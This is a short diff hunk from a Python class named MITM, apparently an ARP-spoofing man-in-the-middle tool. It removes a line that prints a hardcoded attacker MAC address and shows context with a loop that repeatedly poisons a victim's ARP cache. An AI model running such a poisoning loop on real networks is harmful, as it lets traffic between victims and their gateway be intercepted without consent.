@@ -22,7 +22,6 @@ class MITM(object):
 
         print(f'victim mac at : {self.victim_mac}')
         print(f'gate_way mac at : {self.gateway_mac}')
-        print(f'attacker mac at : a4:83:e7:c5:44:92')
         try:
             while True:
                 self._victim_poison(self.victim_ip, self.victim_mac, self.gateway_ip)
